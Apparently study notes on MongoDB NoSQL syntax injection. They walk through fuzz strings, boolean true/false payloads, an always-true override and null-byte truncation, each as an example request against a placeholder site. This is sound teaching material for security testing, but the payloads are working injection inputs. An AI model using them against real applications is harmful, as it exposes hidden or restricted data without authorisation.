# NoSQL Injection – Syntax Injection

# NoSQL Injection – Syntax Injection (MongoDB)

## 1. Types of NoSQL Injection

There are **two main types of NoSQL Injection attacks**:

### 1. Syntax Injection

- Occurs when **user input breaks the NoSQL query syntax**.
- Allows attackers to **inject their own query logic**.
- Similar concept to **SQL Injection**, but adapted for NoSQL query structures.
- Different NoSQL databases use **different query languages and data structures**, so attack methods vary.

### 2. Operator Injection

- Occurs when attackers inject **NoSQL query operators** (e.g., `$ne`, `$gt`, `$regex`).
- Manipulates query behavior without necessarily breaking syntax.

Example:

```json
{"username": {"$ne": null}}
```

---

# Detecting NoSQL Syntax Injection

Testing focuses on **breaking the database query syntax**.

### Method

- Send **fuzz strings or special characters** in user input.
- Observe if:
    - Application errors occur
    - Responses change
    - Unexpected behavior appears

This indicates **input is not properly sanitized**.

---

# Example Scenario

### Application Request

```
https://insecure-website.com/product/lookup?category=fizzy
```

### Backend MongoDB Query

```jsx
this.category == 'fizzy'
```

This query returns **products in the fizzy category**.

---

# Step 1: Inject a Fuzz String

Use special characters that may break query syntax.

Example fuzz string:

```
'"`{
;$Foo}
$Foo \xYZ
```

### Attack Request

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

### Purpose

- Trigger **database parsing errors**
- Identify **unsanitized input**

If the response changes → **Possible NoSQL injection vulnerability**.

---

# Step 2: Identify Interpreted Characters

Test characters individually to see which ones break syntax.

Example payload:

```
'
```

### Resulting Query

```jsx
this.category == '''
```

If the response changes, the `'` **breaks the query syntax**.

---

### Confirm by Escaping

Submit:

```
\'
```

Resulting query:

```jsx
this.category == '\''
```

If this **removes the error**, it confirms **syntax injection potential**.

---

# Step 3: Test Boolean Conditions

Now determine if you can **control query logic**.

Send two payloads:

### False Condition

```
fizzy' && 0 && 'x
```

Query becomes:

```jsx
this.category == 'fizzy' && 0 && 'x'
```

Result:

- Query evaluates **false**
- No products returned

---

### True Condition

```
fizzy' && 1 && 'x
```

Query becomes:

```jsx
this.category == 'fizzy' && 1 && 'x'
```

Result:

- Query evaluates **true**
- Normal results returned

---

### Conclusion

Different responses indicate **user input controls query logic** → **NoSQL Injection confirmed**.

---

# Step 4: Override Existing Conditions

Inject a condition that **always evaluates to true**.

### Payload

```
'||'1'=='1
```

### Attack Request

```
https://insecure-website.com/product/lookup?category=fizzy'||'1'=='1
```

### Resulting Query

```jsx
this.category == 'fizzy' || '1'=='1'
```

### Outcome

- `'1'=='1'` is always **true**
- Entire query becomes **true**

### Impact

- Database returns **all products**
- Includes:
    - Hidden products
    - Products from other categories
    - Possibly restricted items

---

# Null Byte Injection in MongoDB

A **null character (`%00`)** can terminate query processing.

### Original Query

```jsx
this.category == 'fizzy' && this.released == 1
```

Meaning:

- Show only **released fizzy products**

---

### Attack Payload

```
fizzy'%00
```

### Request

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

### Resulting Query

```jsx
this.category == 'fizzy'\u0000' && this.released == 1
```

### Behavior

MongoDB **ignores everything after the null byte**.

So the query effectively becomes:

```jsx
this.category == 'fizzy'
```

---

# Impact

Because the condition `this.released == 1` is ignored:

- **All products in the fizzy category are returned**
- Including **unreleased products**

Possible risks:

- Exposure of **confidential or unreleased items**
- Leakage of **internal product data**
- Business logic bypass
- Information disclosure

---

# Key Testing Techniques

When testing for NoSQL syntax injection:

### Use fuzz strings

```
'"`{
;$Foo}
$Foo \xYZ
```

### Test special characters

```
'
"
`
{
}
;
```

### Test boolean logic

```
' && 1 && '
' && 0 && '
```

### Test always-true conditions

```
'||'1'=='1
```

### Test null byte injection

```
%00
```

---